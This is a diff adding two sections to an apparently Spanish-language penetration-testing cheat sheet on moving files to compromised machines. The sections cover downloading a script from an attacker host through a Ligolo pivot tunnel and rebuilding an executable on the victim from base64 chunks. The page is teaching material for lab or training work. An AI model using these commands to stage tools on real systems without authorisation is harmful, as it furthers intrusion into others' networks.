@@ -197,7 +197,56 @@ curl http://KALI_IP/file.sh -o file.sh</code></pre>
 
             </div>
         </div>
+        <div class="section">
+            <div class="section-header">11. Transfer Through Pivot (Ligolo / Tunnel)</div>
+            <div class="section-content">
 
+                <p>Cuando estás dentro de una red interna, NO puedes usar directamente tu IP de Kali.</p>
+
+                <p><strong>Solución:</strong> usar el túnel (ej: Ligolo)</p>
+
+                <p><strong>Ejemplo:</strong> descargar desde Kali a máquina interna</p>
+
+                <pre><code>wget http://ATTACKER_TUN_IP/file.sh
+</code></pre>
+
+                <p>Tu IP será algo como:</p>
+
+                <pre><code>10.10.0.1 (interfaz ligolo)</code></pre>
+
+                <p><strong>Servidor en Kali:</strong></p>
+
+                <pre><code>python3 -m http.server 80 --bind 0.0.0.0
+</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">12. Transfer Without Tools (Echo / Chunking)</div>
+            <div class="section-content">
+
+                <p>Cuando NO hay wget, curl, nc...</p>
+
+                <p><strong>En Kali:</strong></p>
+
+                <pre><code>base64 file.exe > file.b64
+</code></pre>
+
+                <p><strong>En víctima:</strong></p>
+
+                <pre><code>echo BASE64_PART >> file.b64
+</code></pre>
+
+                <p>Repetir por partes.</p>
+
+                <p><strong>Decodificar:</strong></p>
+
+                <pre><code>base64 -d file.b64 > file.exe
+</code></pre>
+
+            </div>
+        </div>
     </div>
 
     <script>
